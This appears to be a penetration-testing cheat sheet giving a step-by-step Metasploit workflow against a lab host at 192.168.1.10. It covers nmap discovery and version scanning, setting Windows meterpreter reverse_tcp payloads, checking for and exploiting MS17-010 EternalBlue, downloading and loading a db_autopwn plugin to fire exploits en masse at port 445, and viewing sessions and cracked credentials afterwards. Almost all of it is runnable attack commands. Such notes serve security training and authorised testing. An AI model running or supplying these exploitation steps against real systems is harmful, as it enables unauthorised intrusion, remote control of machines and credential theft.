# <u>Metasploit â€” Full Workflow</u> :

## 1. **Host Discovery**

```bash
nmap -sn 192.168.1.0/24
```

â†’ Identify live target (e.g., `192.168.1.10`)

---
## 2. **Metasploit Setup**

```msf
msfconsole
workspace -a testing
workspace testing
setg RHOSTS 192.168.1.10
setg RHOST 192.168.1.10
```

> ðŸ’¡ **Why both `RHOSTS` and `RHOST`?**  
> Some modules expect one, some the other â€” setting both avoids errors.

---
## 3. **Critical Enumeration**

```msf
db_nmap -sV -O 192.168.1.10
hosts
services
```

- `-sV`: Service/version detection  
- `-O`: OS fingerprinting  

â†’ These are **essential** for accurate exploit matching.

---
## 4. **Manual Exploit Search & Pitfalls**

### Problem: Generic or misleading exploit info

```msf
search type:exploit name:"IIS"
use <exploit>
info
```

- Some exploits **donâ€™t specify exact versions**.
- MSF may **default to Linux payload** on Windows targets:

  ```
  [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
  ```
  
### Fix: Explicitly set Windows payload

```msf
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set RPORT 80   # Must match open port from `services`
exploit
```

> âœ… Always verify:
> - Target OS (`sysinfo` post-exploit)
> - Port is open (`services`)
> - Payload matches architecture (x86 vs x64)

---
## 5. **SMB Example: Validate Before Exploiting**

### Step 1: Find relevant exploit via `searchsploit`

```bash
searchsploit "Microsoft Windows SMB" | grep -i metasploit
```

### Step 2: Check if vulnerable (use auxiliary scanner)

```msf
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
run
```

â†’ `[+] Host is likely VULNERABLE`

### Step 3: Exploit

```msf
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
sysinfo  # Confirm Windows access
```

> ðŸ” **Key**: Auxiliary modules **test exploit conditions** â€” never skip this step.

---
## 6. **Automate with `db_autopwn` Plugin**

### Install

```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo cp db_autopwn.rb /usr/share/metasploit-framework/plugins/
```
### Load in MSF

```msf
msfconsole
workspace testing
load db_autopwn
# Ignore deprecation warning â€” it still works
```
### Run Smart Autopwn

```msf
db_autopwn -p -t -PI 445    # Only target port 445
```

- `-p`: Launch exploits  
- `-t`: Show all matches  
- `-PI 445`: **Filter by port** (critical â€” avoids noise)

> âŒ Without `-PI`, it tries **1300+ exploits** â†’ slow, noisy, ineffective.

---
## 7. **Post-Exploitation & Analysis**

### View Results

```msf
vulns          # Confirmed vulnerabilities (from scanners or autopwn)
creds          # Cracked credentials
sessions       # Active Meterpreter sessions
```

### What About `analyze`?

- The `analyze` command **was removed** from modern Metasploit.
- **`db_autopwn` does NOT re-scan** â€” it uses **existing DB data** from:
  - `db_nmap`
  - Manual `services`/`hosts` entries
  - Auxiliary module results (e.g., `smb_ms17_010`)

> âœ… So: **enumerate first**, then run `db_autopwn`.

---
## Key Takeaways

- **Accurate enumeration = successful exploitation**
- Always **set correct Windows payload**
- **Validate** with auxiliary scanners before exploiting
- Use `db_autopwn -PI <port>` â€” never run it blind
- `vulns` shows confirmed weaknesses; `analyze` is gone â€” donâ€™t rely on it
